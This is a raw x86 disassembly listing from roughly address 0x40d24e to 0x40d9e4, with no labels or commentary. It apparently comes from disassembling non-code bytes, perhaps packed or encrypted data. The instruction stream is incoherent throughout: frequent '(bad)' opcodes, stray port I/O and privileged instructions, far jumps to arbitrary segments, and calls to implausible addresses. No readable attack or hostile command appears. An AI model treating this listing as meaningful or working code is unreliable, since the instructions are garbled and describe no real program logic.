  40d24e:	xchg   esi,eax
  40d24f:	fiadd  DWORD PTR [eax]
  40d251:	fild   QWORD PTR [edi]
  40d254:	retf   
  40d255:	fs jnp 0x40d20a
  40d258:	mov    dh,0x5d
  40d25a:	retf   0x100a
  40d25d:	loopne 0x40d2c2
  40d25f:	adc    al,0x7
  40d261:	je     0x40d2bf
  40d263:	jp     0x40d267
  40d265:	sub    eax,0x48f5d4a5
  40d26a:	push   0x5f
  40d26c:	pop    esi
  40d26d:	js     0x40d217
  40d26f:	pop    esi
  40d270:	pop    ebp
  40d271:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d272:	jl     0x40d2e1
  40d274:	ret    0x4c0d
  40d277:	rol    BYTE PTR [edi+eax*1],0x91
  40d27b:	xor    DWORD PTR [edi-0x26ed4087],edi
  40d281:	sub    ah,0xbb
  40d284:	int3   
  40d285:	dec    ecx
  40d286:	ret    
  40d287:	or     DWORD PTR [edi+0x44],esp
  40d28a:	add    BYTE PTR [eax-0x2bd8ffc3],dl
  40d290:	jnp    0x40d21f
  40d292:	mov    esp,0x661fff3b
  40d297:	inc    edi
  40d298:	pop    esi
  40d299:	xlat   BYTE PTR ds:[ebx]
  40d29a:	(bad)  
  40d29b:	scas   al,BYTE PTR es:[edi]
  40d29c:	dec    ebx
  40d29d:	jp     0x40d28b
  40d29f:	inc    ebp
  40d2a0:	and    al,0x4d
  40d2a2:	mov    bh,0xfa
  40d2a4:	add    dl,0x77
  40d2a7:	or     eax,0x5aeff702
  40d2ac:	push   edx
  40d2ad:	std    
  40d2ae:	mov    ?,esi
  40d2b0:	push   esp
  40d2b1:	and    dh,BYTE PTR [eax]
  40d2b3:	popf   
  40d2b4:	mov    es,eax
  40d2b6:	sub    BYTE PTR [eax+0x45],ah
  40d2b9:	mov    dh,0xda
  40d2bb:	cld    
  40d2bc:	jb     0x40d2a1
  40d2be:	jge    0x40d277
  40d2c0:	stos   DWORD PTR es:[edi],eax
  40d2c1:	pop    edx
  40d2c2:	call   0x9a3ccede
  40d2c7:	fcomp  DWORD PTR [edi-0x39]
  40d2ca:	addr16 xor al,0x34
  40d2cd:	imul   eax,DWORD PTR [esi-0x7ff9d346],0x1a8a9729
  40d2d7:	fdiv   st(4),st
  40d2d9:	out    0x32,al
  40d2db:	pop    ebp
  40d2dc:	add    BYTE PTR [esi+0x2870d3bc],dl
  40d2e2:	mov    al,0x62
  40d2e4:	cmp    bl,BYTE PTR [edx-0x1f4b1eb8]
  40d2ea:	es mov ebx,fs
  40d2ed:	xchg   esp,eax
  40d2ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2ef:	repnz pop esp
  40d2f1:	jmp    0x4ced:0xb51d8b9c
  40d2f8:	or     BYTE PTR ds:0xd1aaa5b3,ah
  40d2fe:	sar    ch,0x6e
  40d301:	jno    0x40d36e
  40d303:	ds add edx,eax
  40d306:	mov    WORD PTR [esi],cs
  40d308:	sbb    cl,bl
  40d30a:	out    dx,eax
  40d30b:	push   bp
  40d30d:	push   ebp
  40d30e:	fnstcw WORD PTR [esi+0x481b191]
  40d314:	arpl   WORD PTR [esp+eax*8+0x4fcab906],cx
  40d31b:	push   ecx
  40d31c:	gs add al,0x6f
  40d31f:	mov    ds:0x8bb6f4dc,eax
  40d324:	jae    0x40d2bb
  40d326:	daa    
  40d327:	or     ebx,esi
  40d329:	or     eax,0x50220fcf
  40d32e:	sti    
  40d32f:	stos   DWORD PTR es:[edi],eax
  40d330:	outs   dx,BYTE PTR ds:[esi]
  40d331:	add    al,0x6d
  40d333:	repz xchg ebp,eax
  40d335:	scas   eax,DWORD PTR es:[edi]
  40d336:	mov    ah,BYTE PTR [edx+ecx*8]
  40d339:	retf   
  40d33a:	(bad)  
  40d33b:	push   edi
  40d33c:	or     eax,0x7721ac64
  40d341:	(bad)  
  40d342:	fnstcw WORD PTR [edi+0x4]
  40d345:	fmul   DWORD PTR [edi-0x573819]
  40d34b:	pop    ebp
  40d34c:	mov    bh,0xcc
  40d34e:	mov    ah,0x7a
  40d350:	inc    esi
  40d351:	scas   eax,DWORD PTR es:[edi]
  40d352:	(bad)  
  40d353:	push   esp
  40d354:	and    ecx,ebx
  40d356:	test   DWORD PTR [esi],esp
  40d358:	inc    edi
  40d359:	xor    bh,al
  40d35b:	leave  
  40d35c:	mov    cs,ebx
  40d35e:	pop    esp
  40d35f:	mov    ebp,0x4001c44c
  40d364:	dec    esi
  40d365:	repz loope 0x40d351
  40d368:	or     eax,0x514b0c3
  40d36d:	dec    ecx
  40d36e:	stc    
  40d36f:	xchg   ebx,eax
  40d370:	or     al,al
  40d372:	jl     0x40d391
  40d374:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d375:	sbb    edx,DWORD PTR [ebx]
  40d377:	adc    cl,BYTE PTR [edi+0x210da484]
  40d37d:	pop    esp
  40d37e:	jbe    0x40d379
  40d380:	jecxz  0x40d39e
  40d382:	xor    edx,ebx
  40d384:	push   ecx
  40d385:	cmp    edx,DWORD PTR [esi-0x64d8dfe9]
  40d38b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d38c:	cmc    
  40d38d:	addr16 fldl2e 
  40d390:	loope  0x40d3ba
  40d392:	dec    esi
  40d393:	(bad)  
  40d395:	jb     0x40d3a1
  40d397:	dec    ebx
  40d398:	or     esi,DWORD PTR [edx+eiz*4]
  40d39b:	imul   esp,DWORD PTR [ebp+0x7f626ff0],0xecd009b0
  40d3a5:	ret    
  40d3a6:	add    bh,BYTE PTR [ebp-0x58a63243]
  40d3ac:	xchg   ebx,eax
  40d3ad:	jecxz  0x40d3fe
  40d3af:	shl    BYTE PTR [edi+0x421fdb4],1
  40d3b5:	ja     0x40d3a7
  40d3b7:	shr    BYTE PTR [edx+eax*1],0xe9
  40d3bb:	fnstcw WORD PTR [ebx-0x27a82a60]
  40d3c1:	cmp    ch,dh
  40d3c3:	not    BYTE PTR [edi]
  40d3c5:	cli    
  40d3c6:	sti    
  40d3c7:	sbb    dl,0x4e
  40d3ca:	daa    
  40d3cb:	push   edi
  40d3cc:	or     al,0xa7
  40d3ce:	seta   BYTE PTR [eax-0x15f7b259]
  40d3d5:	xor    al,0x3
  40d3d7:	pop    es
  40d3d8:	push   ss
  40d3d9:	nop
  40d3da:	pop    ds
  40d3db:	neg    DWORD PTR [edx]
  40d3dd:	not    BYTE PTR [ebp-0x7cc8adc7]
  40d3e3:	jno    0x40d3e2
  40d3e5:	pop    ebp
  40d3e6:	or     eax,0x6a46c4e
  40d3eb:	push   0xf0e1779b
  40d3f0:	xor    DWORD PTR [ebx-0x54f44493],edi
  40d3f6:	push   esp
  40d3f7:	pop    es
  40d3f8:	xlat   BYTE PTR fs:[ebx]
  40d3fa:	adc    DWORD PTR [ebp-0x80],0x21
  40d3fe:	sub    ah,ah
  40d400:	pop    edi
  40d401:	int3   
  40d402:	push   ebp
  40d403:	push   ebx
  40d404:	dec    esp
  40d405:	popf   
  40d406:	xor    eax,0x9a09e442
  40d40b:	loope  0x40d3a8
  40d40d:	vpandn xmm0,xmm3,xmm0
  40d411:	popf   
  40d412:	outs   dx,DWORD PTR ds:[esi]
  40d413:	stos   BYTE PTR es:[edi],al
  40d414:	jmp    0x62cc:0xf1d3b0d6
  40d41b:	jge    0x40d468
  40d41d:	lea    ebp,[eax-0x3b2032e3]
  40d423:	pop    edx
  40d424:	int    0x99
  40d426:	mov    eax,0x7dd99d3c
  40d42b:	dec    DWORD PTR [edi-0x227636b]
  40d431:	add    esp,DWORD PTR cs:[eax-0x454ca3be]
  40d438:	aas    
  40d439:	lea    esp,[ebp-0x30]
  40d43c:	into   
  40d43d:	ja     0x40d48f
  40d43f:	ss addr16 inc ebp
  40d442:	or     al,0x4b
  40d444:	test   ebp,eax
  40d446:	mov    esp,0xd423d530
  40d44b:	outs   dx,BYTE PTR ds:[esi]
  40d44c:	test   DWORD PTR [esi+0x56],eax
  40d44f:	push   ss
  40d450:	sbb    eax,0x152feb9e
  40d455:	and    dl,dl
  40d457:	(bad)  
  40d458:	and    BYTE PTR [ebx],dl
  40d45a:	lea    ebp,[edi-0x5a]
  40d45d:	add    DWORD PTR [esi-0x1d],esi
  40d460:	nop
  40d461:	lahf   
  40d462:	add    bl,dl
  40d464:	and    eax,0xaeb24e15
  40d469:	sub    DWORD PTR es:[ebp-0x705de7b9],eax
  40d470:	ror    DWORD PTR [ebx+0x6a4b61d7],cl
  40d476:	xor    eax,DWORD PTR [ecx+0x6d]
  40d479:	out    0x6b,eax
  40d47b:	in     al,dx
  40d47c:	cdq    
  40d47d:	cmp    BYTE PTR [eax-0x3e861e39],dl
  40d483:	enter  0x86b4,0x8e
  40d487:	jmp    0x40d4b7
  40d489:	sbb    bl,BYTE PTR [edi]
  40d48b:	in     eax,0x29
  40d48d:	addr16 cs push esi
  40d490:	js     0x40d501
  40d492:	mov    eax,0xc76347f1
  40d497:	push   ecx
  40d498:	sar    dh,0xe7
  40d49b:	adc    BYTE PTR [eax],cl
  40d49d:	push   ss
  40d49e:	call   0xb63b0350
  40d4a3:	lock adc DWORD PTR [edi+edi*4-0x63],edx
  40d4a8:	sahf   
  40d4a9:	sub    eax,0x9085016a
  40d4ae:	cmc    
  40d4af:	test   al,0xc7
  40d4b1:	and    DWORD PTR [edi+eax*2-0x632f1de9],ecx
  40d4b8:	xchg   edi,eax
  40d4b9:	ja     0x40d46f
  40d4bb:	or     eax,0x6437a2cb
  40d4c0:	call   0x66576870
  40d4c5:	adc    cl,BYTE PTR [esi+ebp*1+0x1a03ad3e]
  40d4cc:	test   eax,0xae3ece4e
  40d4d1:	imul   ebx,DWORD PTR [ebx+0x2d4c6169],0xa861936b
  40d4db:	dec    eax
  40d4dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4dd:	inc    edi
  40d4de:	cmovae esi,ecx
  40d4e1:	dec    esp
  40d4e2:	push   edi
  40d4e3:	xchg   edx,eax
  40d4e4:	retf   
  40d4e5:	jb     0x40d4e4
  40d4e7:	in     eax,dx
  40d4e8:	jb     0x40d53b
  40d4ea:	inc    ecx
  40d4eb:	mov    esi,ebp
  40d4ed:	mov    eax,0x394422b2
  40d4f2:	jb     0x40d492
  40d4f4:	xor    eax,0x247ed73f
  40d4f9:	std    
  40d4fa:	enter  0x7ff,0x4b
  40d4fe:	pop    ebp
  40d4ff:	pusha  
  40d500:	and    BYTE PTR [edi],cl
  40d502:	pop    es
  40d503:	xlat   BYTE PTR ds:[ebx]
  40d504:	inc    edi
  40d505:	fist   WORD PTR [esi]
  40d507:	xlat   BYTE PTR ds:[ebx]
  40d508:	fadd   QWORD PTR [ecx]
  40d50a:	sahf   
  40d50b:	(bad)  
  40d50e:	add    al,0x3d
  40d511:	jo     0x40d4be
  40d513:	aas    
  40d514:	jo     0x40d4ac
  40d516:	push   ds
  40d517:	pushf  
  40d518:	and    BYTE PTR [eax-0x3db20511],cl
  40d51e:	pop    ds
  40d51f:	mov    cl,0x46
  40d521:	div    BYTE PTR [edx-0x7ba8f871]
  40d527:	or     DWORD PTR [ecx-0xd],eax
  40d52a:	(bad)  
  40d52b:	adc    al,ch
  40d52d:	pop    eax
  40d52e:	or     al,0x12
  40d530:	push   es
  40d531:	cs stc 
  40d533:	inc    ecx
  40d534:	xor    al,cl
  40d536:	or     ecx,DWORD PTR [edi+eiz*4+0xd]
  40d53a:	in     al,0xcd
  40d53c:	xchg   edi,eax
  40d53d:	repz sahf 
  40d53f:	cmc    
  40d540:	pop    esp
  40d541:	add    cl,BYTE PTR [ebx+0x7dad2ceb]
  40d547:	stos   DWORD PTR es:[edi],eax
  40d548:	pop    ebp
  40d549:	cmp    al,BYTE PTR [eax-0x2d537c21]
  40d54f:	mov    fs,WORD PTR [ebp+0x21]
  40d552:	add    eax,0x6f2a96d
  40d557:	sahf   
  40d558:	mov    ebp,0x7fd40f1c
  40d55d:	pop    ss
  40d55e:	icebp  
  40d55f:	push   es
  40d560:	bound  edi,QWORD PTR [ebp-0x880dc3a]
  40d566:	push   edi
  40d567:	mov    eax,ds:0xb82a8d59
  40d56c:	sub    BYTE PTR [esi+ebx*2+0x5],0xe4
  40d571:	lds    esp,FWORD PTR [esi]
  40d573:	clc    
  40d574:	aam    0x3c
  40d576:	inc    ebx
  40d577:	stos   DWORD PTR es:[edi],eax
  40d578:	push   esi
  40d579:	hlt    
  40d57a:	inc    eax
  40d57b:	jns    0x40d5bb
  40d57d:	std    
  40d57e:	enter  0x1915,0xf
  40d582:	shl    BYTE PTR [ecx+0x107a8b87],1
  40d588:	adc    DWORD PTR [edi],0x5af6aab3
  40d58e:	sbb    al,0x7c
  40d590:	or     dh,BYTE PTR [ecx-0x30]
  40d593:	sub    al,0x79
  40d595:	loope  0x40d53c
  40d597:	xlat   BYTE PTR ds:[ebx]
  40d598:	lds    ecx,FWORD PTR [esi+0x46]
  40d59b:	cld    
  40d59c:	lahf   
  40d59d:	mov    ds:0x2484206,eax
  40d5a2:	cmc    
  40d5a3:	inc    ebx
  40d5a4:	xchg   esi,eax
  40d5a5:	cmp    ah,BYTE PTR [ecx-0xcbe59e3]
  40d5ab:	(bad)  
  40d5ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5ad:	mov    ds:0x70a228bf,al
  40d5b2:	loope  0x40d601
  40d5b4:	push   edi
  40d5b5:	mov    eax,ds:0xd1573f2b
  40d5ba:	push   eax
  40d5bb:	jmp    0x2229:0xbd240b20
  40d5c2:	stos   BYTE PTR es:[edi],al
  40d5c3:	and    BYTE PTR [edi+esi*8+0x6d],bl
  40d5c7:	test   BYTE PTR [ecx-0x7e],dh
  40d5ca:	push   ebx
  40d5cb:	mov    ah,0xd6
  40d5cd:	cs iret 
  40d5cf:	dec    edi
  40d5d0:	xlat   BYTE PTR ds:[ebx]
  40d5d1:	or     ebx,DWORD PTR [ebp-0xf]
  40d5d4:	push   esi
  40d5d5:	mov    esi,ebx
  40d5d7:	add    al,0xa4
  40d5d9:	and    al,0xd1
  40d5db:	mov    ds:0x3f4e7377,al
  40d5e0:	cwde   
  40d5e1:	sbb    eax,0xc1ab9c8b
  40d5e6:	cdq    
  40d5e7:	adc    eax,0xc6794dd3
  40d5ec:	imul   edx,DWORD PTR [eax-0x1b3b62d1],0x57218228
  40d5f6:	dec    ecx
  40d5f7:	cmc    
  40d5f8:	push   eax
  40d5f9:	pop    ebp
  40d5fa:	lahf   
  40d5fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5fc:	stos   DWORD PTR es:[edi],eax
  40d5fd:	add    DWORD PTR ds:[edi+0x27],0xffffff85
  40d602:	push   esp
  40d603:	push   ss
  40d604:	test   DWORD PTR [esi],eax
  40d606:	inc    ecx
  40d607:	scas   al,BYTE PTR es:[edi]
  40d608:	mov    ebx,0x31f37587
  40d60d:	int    0x78
  40d60f:	iret   
  40d610:	les    ebx,FWORD PTR [ebx+0x77]
  40d613:	xor    al,0x9b
  40d615:	jp     0x40d5b7
  40d617:	mov    esi,0x258e7a9e
  40d61c:	push   0xffffff9a
  40d61e:	mov    ebx,ds
  40d620:	loop   0x40d66e
  40d622:	ds push 0xfb06921e
  40d628:	push   edi
  40d629:	dec    esi
  40d62a:	(bad)  
  40d62b:	ret    0x4a88
  40d62e:	add    edx,DWORD PTR [edx-0x64]
  40d631:	pop    ebx
  40d632:	in     eax,0x4c
  40d634:	sub    eax,0x2a0e62df
  40d639:	icebp  
  40d63a:	into   
  40d63b:	jp     0x40d6a7
  40d63d:	data16 mov bh,0x17
  40d640:	fistp  DWORD PTR [ebx-0x5]
  40d643:	mov    WORD PTR [eax],cs
  40d645:	fisub  DWORD PTR [edi-0x7f25b018]
  40d64b:	cmp    DWORD PTR [esi+eiz*1+0x7c1da366],ebp
  40d652:	cmp    ebp,DWORD PTR [esi+0x4c43d942]
  40d658:	dec    esi
  40d659:	adc    al,0xa6
  40d65b:	in     eax,0x21
  40d65d:	push   edi
  40d65e:	ficomp WORD PTR [ebx]
  40d660:	mov    bh,0x26
  40d662:	sbb    BYTE PTR [edi-0x2990ea91],ch
  40d668:	mov    al,0xd3
  40d66a:	push   ecx
  40d66b:	ss dec esp
  40d66d:	inc    edi
  40d66e:	sbb    ebp,DWORD PTR ds:[eax+0x59170c12]
  40d675:	add    eax,0xd1c997d1
  40d67a:	xchg   ecx,eax
  40d67b:	sub    edi,DWORD PTR [ebp+0x5d]
  40d67e:	xchg   edx,eax
  40d67f:	das    
  40d680:	sub    bh,al
  40d682:	jl     0x40d644
  40d684:	cmp    bl,BYTE PTR [esp+ecx*2-0x4b]
  40d688:	or     DWORD PTR [eax+eax*4+0x192cf80d],eax
  40d68f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d690:	mov    ah,0x88
  40d692:	adc    ebx,edi
  40d694:	test   BYTE PTR [edi-0x9],ah
  40d697:	mov    eax,ds:0x6ac53887
  40d69c:	sbb    DWORD PTR [esi-0x65],ebx
  40d69f:	xor    DWORD PTR [ebx+0x4c],ebx
  40d6a2:	dec    edi
  40d6a3:	ja     0x40d64c
  40d6a5:	cs push eax
  40d6a7:	enter  0x7569,0x98
  40d6ab:	adc    DWORD PTR [ebx-0x9b9f043],esi
  40d6b1:	aas    
  40d6b2:	ja     0x40d72f
  40d6b4:	dec    edi
  40d6b5:	mov    eax,0x13948cd9
  40d6ba:	jl     0x40d69c
  40d6bc:	mov    es,WORD PTR [edx-0x3f]
  40d6bf:	aas    
  40d6c0:	retf   
  40d6c1:	arpl   dx,bx
  40d6c3:	jg     0x40d676
  40d6c5:	in     eax,dx
  40d6c6:	imul   esi,DWORD PTR [eax],0xce30a94f
  40d6cc:	cdq    
  40d6cd:	(bad)  [edi+0xb]
  40d6d0:	loop   0x40d721
  40d6d2:	sbb    cl,bl
  40d6d4:	cmp    DWORD PTR [esi-0x575862d7],ebx
  40d6da:	push   esp
  40d6db:	dec    eax
  40d6dc:	xor    edx,DWORD PTR [edx]
  40d6de:	inc    eax
  40d6df:	push   edx
  40d6e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6e1:	call   0xf1031369
  40d6e6:	retf   
  40d6e7:	outs   dx,BYTE PTR ds:[esi]
  40d6e8:	xchg   bx,ax
  40d6ea:	mov    eax,0x9dc02060
  40d6ef:	pop    esp
  40d6f0:	data16 add ah,cl
  40d6f3:	enter  0xb86d,0xb9
  40d6f7:	pusha  
  40d6f8:	or     eax,DWORD PTR [edx]
  40d6fa:	inc    edi
  40d6fb:	mov    esi,0x625c82c8
  40d700:	loop   0x40d6a7
  40d702:	jge    0x40d695
  40d704:	ret    0x8b80
  40d707:	and    eax,ecx
  40d709:	retf   0x81df
  40d70c:	(bad)  
  40d70d:	sub    BYTE PTR [edx+0x2f4e42fe],ch
  40d713:	add    cl,bl
  40d715:	cld    
  40d716:	cli    
  40d717:	pop    edi
  40d718:	cmc    
  40d719:	push   esi
  40d71a:	cmp    dh,dh
  40d71c:	jl     0x40d75a
  40d71e:	fisttp DWORD PTR fs:[edx+0x6fe62893]
  40d725:	cmp    ebp,DWORD PTR [eax+0x1c99fe9e]
  40d72b:	lds    ecx,FWORD PTR [eax+0x8df4ed8]
  40d731:	(bad)  
  40d732:	mov    dl,0x5b
  40d734:	test   BYTE PTR [ecx+0x6bd4ca3c],cl
  40d73a:	fwait
  40d73b:	out    dx,eax
  40d73c:	and    esi,esi
  40d73e:	sbb    BYTE PTR [esi-0x2827ba75],0xd6
  40d745:	jp     0x40d7bc
  40d747:	xchg   DWORD PTR [esi],eax
  40d749:	fcomp  DWORD PTR [edx-0x3e]
  40d74c:	(bad)  
  40d74d:	push   ebx
  40d74e:	fs ja  0x40d7a8
  40d751:	jg     0x40d7ad
  40d753:	or     BYTE PTR [ebp+0xe1c1c63],dl
  40d759:	into   
  40d75a:	add    dh,BYTE PTR [ebx-0x770ec348]
  40d760:	adc    eax,0xb9863417
  40d765:	mov    bh,0xf2
  40d767:	into   
  40d768:	add    BYTE PTR [eax+edi*1-0x4c],al
  40d76c:	hlt    
  40d76d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d76e:	sub    ch,BYTE PTR [edx-0x39]
  40d771:	sub    bl,BYTE PTR [ecx+ebx*8]
  40d774:	test   al,0xa9
  40d776:	adc    BYTE PTR [edi-0x1b],cl
  40d779:	and    BYTE PTR ds:0x7749d073,al
  40d77f:	and    bl,BYTE PTR [edx+0x6a]
  40d782:	ss jmp 0x3c1138f5
  40d788:	cwde   
  40d789:	repz xor ch,BYTE PTR [edi+0x1222f2c3]
  40d790:	out    dx,eax
  40d791:	and    al,dl
  40d793:	sbb    BYTE PTR [ebx-0x5c],bl
  40d796:	or     cl,BYTE PTR [edx]
  40d798:	xchg   ebp,eax
  40d799:	jne    0x40d813
  40d79b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d79c:	add    BYTE PTR [edi-0x906789e],bl
  40d7a2:	mul    BYTE PTR [esi]
  40d7a4:	cdq    
  40d7a5:	pop    esp
  40d7a6:	mov    ds:0x82ccafe4,al
  40d7ab:	fstp   DWORD PTR ds:0x695d21ac
  40d7b1:	adc    eax,0x1ef6226f
  40d7b6:	iret   
  40d7b7:	xor    al,0x4c
  40d7b9:	mov    bl,0x61
  40d7bb:	mov    edx,0x31bf25b6
  40d7c0:	fs das 
  40d7c2:	sti    
  40d7c3:	jae    0x40d838
  40d7c5:	xor    DWORD PTR [ebp+0xd],eax
  40d7c8:	and    DWORD PTR [ecx-0x72],0x332d413d
  40d7cf:	addr16 xchg ebx,eax
  40d7d1:	jbe    0x40d7f5
  40d7d3:	in     al,0x93
  40d7d5:	mov    esp,0x8115c6b3
  40d7da:	int3   
  40d7db:	aas    
  40d7dc:	and    BYTE PTR [ebp+0x47],dh
  40d7df:	push   0xce9e4765
  40d7e4:	push   ebp
  40d7e5:	stos   BYTE PTR es:[edi],al
  40d7e6:	mov    edi,0xa4452155
  40d7eb:	cmp    BYTE PTR [ecx+0x0],bl
  40d7ee:	div    BYTE PTR [edx]
  40d7f0:	fdiv   DWORD PTR [edx-0xfd0acc1]
  40d7f6:	push   cs
  40d7f7:	jmp    0xede93cd3
  40d7fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7fd:	mov    ebx,0x57222b3d
  40d802:	pop    eax
  40d803:	add    al,0xd2
  40d805:	and    DWORD PTR [ebp+esi*8-0x48b94f4],0x4408b666
  40d810:	(bad)
  40d813:	aad    0x2d
  40d815:	(bad)  
  40d816:	lods   eax,DWORD PTR ds:[esi]
  40d817:	sbb    DWORD PTR [edx-0xfd9d120],0xffffff97
  40d81e:	xor    cl,bh
  40d820:	cmp    BYTE PTR [edi*4+0x7a49fa43],0x11
  40d828:	sub    al,0xb4
  40d82a:	hlt    
  40d82b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d82c:	test   eax,0xeaf184f3
  40d831:	(bad)  
  40d833:	pop    ebx
  40d834:	lods   eax,DWORD PTR ds:[esi]
  40d835:	add    ebx,DWORD PTR [edi]
  40d837:	cmp    ecx,ebp
  40d839:	pop    ss
  40d83a:	mov    eax,ds:0xf193dd88
  40d83f:	xlat   BYTE PTR ds:[ebx]
  40d840:	add    BYTE PTR [edx+0x66d527cd],0xc2
  40d847:	cmp    ecx,esp
  40d849:	nop
  40d84a:	adc    edi,DWORD PTR [edx-0x3d]
  40d84d:	mov    eax,0x9d524e02
  40d852:	aad    0x4d
  40d854:	mov    dh,0xc0
  40d856:	iret   
  40d857:	dec    ebx
  40d858:	dec    edx
  40d859:	das    
  40d85a:	jge    0x40d8b3
  40d85c:	xor    eax,0xdece6f1f
  40d861:	(bad)  
  40d862:	rol    ch,cl
  40d864:	jle    0x40d83e
  40d866:	jg     0x40d8a5
  40d868:	test   eax,0x34704ebc
  40d86d:	je     0x40d7fc
  40d86f:	addr16 push edx
  40d871:	popa   
  40d872:	pop    esi
  40d873:	push   ebp
  40d874:	loopne 0x40d877
  40d876:	push   esp
  40d877:	retf   0x6a4d
  40d87a:	jl     0x40d867
  40d87c:	xchg   ecx,eax
  40d87d:	into   
  40d87e:	or     ah,BYTE PTR [ebx+0x55]
  40d881:	sub    esp,DWORD PTR [ebx-0x15be847f]
  40d887:	cmp    al,0x51
  40d889:	sub    eax,0xe64ecdd8
  40d88e:	enter  0x8c4e,0x6a
  40d892:	retf   0xc59b
  40d895:	call   DWORD PTR [edx+0x76]
  40d898:	mov    DWORD PTR [edi+0x3],ebp
  40d89b:	retf   0x50cc
  40d89e:	ret    0xbe6e
  40d8a1:	pop    ebp
  40d8a2:	pusha  
  40d8a3:	xchg   ebp,eax
  40d8a4:	fdiv   DWORD PTR [ebp+ebp*1+0x4]
  40d8a8:	jge    0x40d88c
  40d8aa:	ja     0x40d8f0
  40d8ac:	sbb    edi,DWORD PTR [ecx+0x20]
  40d8af:	and    al,BYTE PTR [esp+edx*1]
  40d8b2:	arpl   WORD PTR [ebp+0x7c73e2be],si
  40d8b8:	mov    al,0x3f
  40d8ba:	aam    0x77
  40d8bc:	lods   al,BYTE PTR ds:[esi]
  40d8be:	cmp    ecx,DWORD PTR [ebp-0x3b]
  40d8c1:	int3   
  40d8c2:	rcr    bl,0x9
  40d8c5:	(bad)  [edx-0x7]
  40d8c8:	mov    edx,0x16be3f03
  40d8cd:	adc    al,0xc6
  40d8cf:	xor    ah,BYTE PTR [ebx-0x79]
  40d8d2:	out    dx,al
  40d8d3:	push   es
  40d8d4:	fistp  WORD PTR [eax-0x52]
  40d8d7:	sub    BYTE PTR [edi+0x7b323407],bl
  40d8dd:	inc    DWORD PTR [edi+0x4458e030]
  40d8e3:	xor    ah,BYTE PTR [edx-0x3e]
  40d8e6:	jb     0x40d8c1
  40d8e8:	pop    eax
  40d8e9:	mov    ebx,0x3ab0d649
  40d8ee:	aad    0xd8
  40d8f0:	(bad)  
  40d8f1:	aad    0x74
  40d8f3:	sub    al,0x7c
  40d8f5:	xor    BYTE PTR [edx-0x6628803d],bl
  40d8fb:	push   edx
  40d8fc:	das    
  40d8fd:	inc    BYTE PTR [ebx-0x7e7e765b]
  40d903:	inc    eax
  40d904:	in     eax,dx
  40d905:	cmp    dh,BYTE PTR [ecx-0x4d42d460]
  40d90b:	ud2    
  40d90d:	aam    0x5c
  40d90f:	inc    edi
  40d910:	push   esi
  40d911:	xor    BYTE PTR [esp+ebp*2-0x17],bl
  40d915:	xchg   BYTE PTR [eax+0x28],bl
  40d918:	push   edx
  40d919:	pusha  
  40d91a:	add    al,0xda
  40d91c:	test   ecx,edx
  40d91e:	cmp    DWORD PTR [ebp-0x6a],edi
  40d921:	hlt    
  40d922:	add    eax,0xe06d62b2
  40d927:	stos   DWORD PTR es:[edi],eax
  40d928:	and    ebx,DWORD PTR [eax+0x37]
  40d92b:	jnp    0x40d8f7
  40d92d:	aas    
  40d92e:	iret   
  40d92f:	(bad)  
  40d930:	(bad)  [ecx+0x10]
  40d933:	popa   
  40d934:	sti    
  40d935:	adc    dl,ch
  40d937:	xchg   BYTE PTR [ecx],bl
  40d939:	cmp    DWORD PTR ds:[esi],ecx
  40d93c:	pushf  
  40d93d:	lods   al,BYTE PTR ds:[esi]
  40d93e:	(bad)  
  40d93f:	stos   DWORD PTR es:[edi],eax
  40d940:	fcmovne st,st(6)
  40d942:	push   0xdc260ca7
  40d947:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d948:	and    eax,0x8f2083bd
  40d94d:	mov    al,ds:0x5f8448e2
  40d952:	cwde   
  40d953:	fadd   st,st(1)
  40d955:	mov    esi,0xbdc764f3
  40d95a:	shl    DWORD PTR [edx+0x43],1
  40d95d:	cmc    
  40d95e:	cmp    DWORD PTR [ebp-0x62],ebp
  40d961:	lock xor al,0x3e
  40d964:	mov    cl,0x33
  40d966:	test   al,0xb9
  40d968:	pop    ebp
  40d969:	mov    esi,0x4b00ef0b
  40d96e:	pop    esp
  40d96f:	or     BYTE PTR [ecx-0x565584af],ch
  40d975:	pop    esi
  40d976:	xor    eax,0x89d056c7
  40d97b:	pop    ds
  40d97c:	adc    eax,0xd6338e5e
  40d981:	mov    eax,ds:0xcdc874bb
  40d986:	(bad)  
  40d988:	cmp    edi,DWORD PTR [ebx+0x7426b065]
  40d98e:	xchg   edi,eax
  40d98f:	aas    
  40d990:	into   
  40d991:	fiadd  WORD PTR [edx-0x367ab08e]
  40d997:	xchg   esp,eax
  40d998:	es ret 0x9388
  40d99c:	aam    0x92
  40d99e:	sbb    DWORD PTR [edx-0x2ac72ec8],esi
  40d9a4:	test   eax,0xaaa72794
  40d9a9:	lahf   
  40d9aa:	xor    al,0xf6
  40d9ac:	push   edi
  40d9ad:	xchg   esp,eax
  40d9ae:	lds    esp,FWORD PTR [ebx]
  40d9b0:	lods   al,BYTE PTR ds:[esi]
  40d9b1:	test   al,0x3
  40d9b3:	push   ds
  40d9b4:	dec    edx
  40d9b5:	repnz sar DWORD PTR [esi-0xd],1
  40d9b9:	jl     0x40d9a6
  40d9bb:	sbb    al,0x4f
  40d9bd:	pop    es
  40d9be:	xchg   BYTE PTR [ebp-0x4e8d8ed2],al
  40d9c4:	xchg   BYTE PTR [esi+ebx*2],dh
  40d9c7:	fimul  DWORD PTR [ebx-0x2c317abf]
  40d9cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9ce:	call   0x6b700f
  40d9d3:	cmp    al,0x6d
  40d9d5:	push   edi
  40d9d6:	mov    edi,0x7f19ee35
  40d9db:	int3   
  40d9dc:	call   0x810baa0e
  40d9e1:	aaa    
  40d9e2:	add    cl,BYTE PTR [ecx]
  40d9e4:	rcl    esi,1
